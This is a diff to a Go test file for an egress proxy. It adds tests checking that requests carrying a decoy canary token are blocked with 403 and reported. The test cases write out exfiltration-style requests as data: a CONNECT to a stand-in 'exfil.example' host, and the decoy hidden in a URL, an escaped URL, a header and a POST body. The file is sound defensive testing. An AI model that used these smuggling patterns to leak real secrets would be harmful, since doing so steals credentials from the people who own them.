@@ -2,12 +2,14 @@ package egress
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"errors"
 	"io"
 	"net"
 	"net/http"
 	"net/netip"
+	"strconv"
 	"strings"
 	"sync"
 	"testing"
@@ -231,6 +233,45 @@ func TestUnreachableUpstreamIsABadGateway(t *testing.T) {
 	p2, _, _ := newProxy(t, Policy{Allow: []string{"api.example.com:80"}})
 	p2.Dial = func(context.Context, string, string) (net.Conn, error) { return nil, errors.New("refused") }
 	assert.Contains(t, request(t, p2, "GET http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\n\r\n", ""), "502")
+}
+
+func TestCanaryInARequestIsRefusedAndReported(t *testing.T) {
+	const decoy = "klc-canary-stripe-0123456789abcdef"
+	type tripped struct{ host, where string }
+	cases := map[string]struct {
+		raw   string
+		where string
+	}{
+		"connect target": {"CONNECT " + decoy + ".exfil.example:443 HTTP/1.1\r\nHost: x\r\n\r\n", "connect_target"},
+		"url":            {"GET http://api.example.com/?k=" + decoy + " HTTP/1.1\r\nHost: api.example.com\r\n\r\n", "url"},
+		"escaped url":    {"GET http://api.example.com/?k=klc%2Dcanary%2Dstripe%2D0123456789abcdef HTTP/1.1\r\nHost: api.example.com\r\n\r\n", "url"},
+		"header":         {"GET http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\nX-Debug: " + decoy + "\r\n\r\n", "header:x-debug"},
+		"body": {"POST http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\nContent-Length: " + strconv.Itoa(len(decoy)+2) + "\r\n\r\n[" + decoy + "]",
+			"body"},
+	}
+	for name, tc := range cases {
+		t.Run(name, func(t *testing.T) {
+			p, up, _ := newProxy(t, Policy{Allow: []string{"api.example.com:80", decoy + ".exfil.example:443"}})
+			var got []tripped
+			p.Canary = func(b []byte) bool { return bytes.Contains(b, []byte(decoy)) }
+			p.OnCanary = func(host, where string) { got = append(got, tripped{host, where}) }
+			out := request(t, p, tc.raw, "")
+			assert.Contains(t, out, "403")
+			assert.Contains(t, out, "canary")
+			require.Len(t, got, 1)
+			assert.Equal(t, tc.where, got[0].where)
+			assert.Empty(t, up.addrs(), "a request that carries a decoy is never forwarded")
+		})
+	}
+}
+
+func TestACleanRequestPassesTheCanaryCheck(t *testing.T) {
+	p, up, _ := newProxy(t, Policy{Allow: []string{"api.example.com:80"}})
+	p.Canary = func(b []byte) bool { return bytes.Contains(b, []byte("klc-canary")) }
+	p.OnCanary = func(string, string) { t.Fatal("no decoy was sent") }
+	out := request(t, p, "GET http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\nX-Note: hello\r\n\r\n", "")
+	assert.Contains(t, out, "200 OK")
+	assert.Equal(t, []string{"93.184.216.34:80"}, up.addrs())
 }
 
 func TestGarbageIsDropped(t *testing.T) {
